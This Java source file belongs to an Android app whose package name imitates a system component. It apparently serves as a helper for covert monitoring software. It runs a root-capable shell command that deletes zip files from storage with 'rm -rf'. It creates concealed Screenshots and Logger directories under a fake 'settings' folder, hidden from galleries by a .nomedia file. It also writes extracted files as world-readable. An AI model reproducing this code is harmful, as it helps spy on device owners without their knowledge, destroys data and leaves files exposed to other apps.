package com.android.classic.helper;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.zip.GZIPInputStream;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Environment;
import eu.chainfire.libsuperuser.Shell;

@SuppressLint("SimpleDateFormat")
public class Methods {

	static String[] cleanCommand = { "rm -rf /sdcard/*__.zip" };

	public static void cleanupFile() {
		Shell.SH.run(Methods.cleanCommand);

		/* Create Paths */
		File patha = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/");
		File path = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/");
		File pathSS = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Screenshots/");
		File nomedia = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/.nomedia");
		File pathcmd = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Logger/");
		patha.mkdirs();
		path.mkdirs();
		pathcmd.mkdirs();
		pathSS.mkdirs();
		try {
			nomedia.createNewFile();
		} catch (IOException e) {
		}
		/* */
	}

	// extracted gz files to files dir so we can use them
	@SuppressLint("WorldReadableFiles")
	@SuppressWarnings("deprecation")
	public static void SaveIncludedZippedFileIntoFilesFolder(String filePath,
			String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.openFileInput(filePath);
		FileOutputStream fos = ApplicationContext.openFileOutput(filename,
				Context.MODE_WORLD_READABLE);
		GZIPInputStream gzis = new GZIPInputStream(is);
		byte[] bytebuf = new byte[1024];
		int read;
		while ((read = gzis.read(bytebuf)) >= 0) {
			fos.write(bytebuf, 0, read);
		}
		gzis.close();
		fos.getChannel().force(true);
		fos.flush();
		fos.close();
	}
}